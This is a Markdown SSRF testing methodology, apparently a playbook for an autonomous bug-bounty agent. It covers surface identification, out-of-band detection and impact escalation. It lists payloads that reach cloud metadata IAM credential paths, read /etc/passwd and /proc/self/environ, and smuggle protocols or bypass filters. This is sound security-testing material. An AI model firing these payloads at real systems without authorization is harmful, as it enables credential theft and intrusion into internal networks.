# Server-Side Request Forgery (SSRF)
## Methodology for Autonomous Bug Hunting

> SSRF is the single highest-impact finding on cloud-hosted apps because it
> often unlocks IMDS credentials, internal-only services, and lateral movement.
> Always test it where any user input lands in a server-side URL fetch.

---

## Phase 1: Surface Identification

### Where SSRF lives
- Webhooks, callback URLs, profile picture URL fields
- Image / PDF / HTML rendering services (server-side fetch)
- Open-graph / link preview features
- Import-from-URL forms
- XML / SVG / DOCX uploads (XXE-adjacent)
- WebSocket proxies, GraphQL `@connect` directives
- File-fetch in API endpoints (`url=`, `dest=`, `target=`, `redirect_to=`)
- Headers reflected into outbound requests: `Forwarded`, `X-Forwarded-Host`, `Referer`

### Quick triage
- Send a benign in-scope URL — is it fetched? (look at response timing /
  content / errors)
- Send a non-existent URL — does the server bubble up a connection error?
  Connection errors leak: hostname resolution behaviour, timeout shape, and
  often the internal user-agent string.

---

## Phase 2: Detection (use OOB, always)

In-band SSRF rarely fires on real apps — most SSRF is BLIND. The OOB tool
is your primary detector.

### Step 1 — Mint an OOB domain
Use `oob_get_domain(label="ssrf-<param-name>")`. Store the `token` and the
`domain` it returns.

### Step 2 — Plant the domain
Send the request with `http://<domain>/canary` (or just `<domain>`) in the
suspected URL parameter. Try multiple shapes:

```
url=http://<oob>/canary
url=//<oob>/canary
url=<oob>
target=http://<oob>:80
webhook_url=http://<oob>/wh
image=http://<oob>/img.png
```

### Step 3 — Poll
`oob_poll(token=<token>, timeout=20)`. ANY interaction (HTTP, DNS, even
just the SYN) confirms SSRF. Note the `remote_address` — it's the
server-side egress IP, useful for the report and for telling internal vs.
edge-fronted setups apart.

### Step 4 — Confirm with a second token
Re-mint a fresh token, re-send. If the second callback arrives, you have a
reproducible PoC, not ambient noise.

---

## Phase 3: Impact Escalation

### 3.1 Cloud Metadata
Once SSRF is confirmed, attempt cloud metadata services:

| Provider | URL |
|----------|-----|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` |
| AWS IMDSv2 | Two-step: `PUT /latest/api/token` then `GET` with token |
| GCP        | `http://metadata.google.internal/computeMetadata/v1/` (header `Metadata-Flavor: Google`) |
| Azure      | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (header `Metadata: true`) |
| Alibaba    | `http://100.100.100.200/latest/meta-data/` |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` |
| Oracle     | `http://192.0.0.192/latest/` |

For each: send the URL, capture the response. Look for IAM credentials
under `iam/security-credentials/<role>` (AWS) — those are critical findings.

### 3.2 Internal network probing
- `http://localhost:80/`, `http://127.0.0.1:8080/`
- `http://[::1]:80/`
- Common internal hosts: `redis://localhost:6379/info`, `http://elasticsearch:9200/_cat/indices`
- DNS rebinding: `http://attacker.dns-rebinding-domain/` (advanced)

### 3.3 Filter bypasses
- Decimal IP: `http://2130706433/` = `127.0.0.1`
- Hex IP: `http://0x7f000001/`
- Octal: `http://0177.0.0.1/`
- IPv6 mapped: `http://[::ffff:127.0.0.1]/`
- DNS that resolves to internal: register `intra.example.com` -> `127.0.0.1`
- URL parser confusion: `http://attacker.com#@victim.internal/`,
  `http://attacker.com\@victim/`, `http://attacker.com:80@victim/`
- Protocol smuggling: `gopher://`, `dict://`, `ldap://`, `file:///etc/passwd`

---

## Phase 4: Payload Families (cheatsheet)

```
# baseline OOB
http://<oob>/

# IMDS w/ trailing dot, comment, no-op auth
http://169.254.169.254./latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# protocol smuggling
gopher://localhost:6379/_INFO
dict://localhost:11211/stats
file:///etc/passwd
file:///proc/self/environ

# parser confusion (look for the DIFFERENT host getting fetched)
http://<oob>@victim/         (most fetchers will hit <oob>)
http://victim#@<oob>/
http://victim%23@<oob>/

# decimal / hex
http://2130706433/
http://0x7f.0.0.1/
```

---

## Phase 5: Verification + PoC

A SSRF finding worth reporting includes:
- The exact request that triggered the callback
- The OOB interaction record (timestamp, remote IP, protocol)
- A reproduction with a fresh token
- Impact statement: blind-only / can read internal resources /
  cloud-metadata exfil-able / can pivot to specific service

The validator will rerun the OOB chain — make sure the PoC payload is
deterministic (avoid time-of-day, randomized tokens that get blocked,
session state).
